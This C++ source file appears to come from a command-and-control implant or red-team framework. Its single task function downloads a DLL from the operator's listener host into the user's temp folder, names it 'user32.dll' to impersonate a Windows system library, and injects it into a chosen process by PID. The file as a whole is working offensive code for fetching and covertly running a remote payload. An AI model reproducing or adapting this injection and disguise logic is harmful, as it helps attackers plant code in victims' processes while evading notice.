#include "core/task.hpp"

namespace Task
{
    // Load DLL and spawn modules.
    std::wstring Dll(State::PState pState, const std::wstring& wPid, const std::wstring& wSrc)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // Set the DLL file path to inject
        std::wstring wDllDestName = L"user32.dll"; // Impersonate the file name.
        std::wstring wDllDest = System::Env::GetStrings(L"%TEMP%") + L"\\" + wDllDestName;
        size_t dwDllDestSize = (wDllDest.size() + 1) * sizeof(wchar_t);

        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";

        // Download a DLL file
        if (!System::Http::DownloadFile(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            wHeaders.c_str(),
            wSrc,
            wDllDest
        )) {
            return L"Error: Failed to download DLL file.";
        }

        // Inject DLL
        if (!Technique::Injection::DllInjection(dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize))
        {
            return L"Error: Failed to injection DLL.";
        }

        return L"Success: Dll injected successfully.";
    }
}